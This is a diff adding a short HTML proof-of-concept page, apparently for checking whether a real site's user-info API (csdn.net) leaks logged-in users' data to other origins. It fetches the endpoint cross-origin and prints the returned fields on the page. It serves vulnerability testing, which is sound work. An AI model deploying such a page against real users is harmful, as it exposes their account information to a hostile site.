@@ -1,0 +1,22 @@
+<html>
+    <head>
+        <title>JSONP漏洞验证</title>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+    </head>
+    <body>
+        <h4>从本页面发起请求所获取的JSON数据如下，如果依然包含敏感信息，则说明该API存在JSONP漏洞：</h4>
+        <script>
+            $.getJSON("https://www.csdn.net/community/toolbar-api/v1/get-user-info", function(data){
+                  var items = [];
+                  $.each( data, function( key, val ) {
+                    items.push( "<li id='" + key + "'>" + val + "</li>" );
+                  });
+                 
+                  $( "<ul/>", {
+                    "class": "my-new-list",
+                    html: items.join( "" )
+                  }).appendTo( "body" );
+            });
+        </script>
+    </body>
+</html>
